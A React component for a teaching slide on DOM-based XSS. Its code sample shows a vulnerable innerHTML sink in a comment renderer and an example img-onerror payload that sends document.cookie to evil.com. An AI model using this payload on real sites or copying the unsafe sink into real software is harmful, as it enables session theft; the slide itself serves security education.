import { Slide, Code } from "@revealjs/react";
import { red } from "../../shared/colors";

export function XssDemo() {
  return (
    <Slide>
      <h2>Classic DOM XSS</h2>
      <h3 style={{ color: red, marginBottom: "0.6em" }}>No protection</h3>
      <Code language="javascript" lineNumbers trim>
        {`// A comment section that renders user content
function renderComment(userInput) {
  const commentEl = document.getElementById('comments');

  // Dangerous: user input goes directly into a sink
  commentEl.innerHTML += \`<div class="comment">\${userInput}</div>\`;
}

// Attacker submits this as a "comment":
renderComment(
  '<img src=x onerror="document.location=\\'https://evil.com/steal?c=\\'+document.cookie">'
);

// The browser parses the string as HTML, the onerror fires,
// and the user's cookies are sent to the attacker.`}
      </Code>
      <p style={{ fontSize: "0.85em", color: red, marginTop: "0.8em" }}>
        The browser has no way to know this string was not meant to be HTML. It
        parses and executes whatever it receives.
      </p>
    </Slide>
  );
}
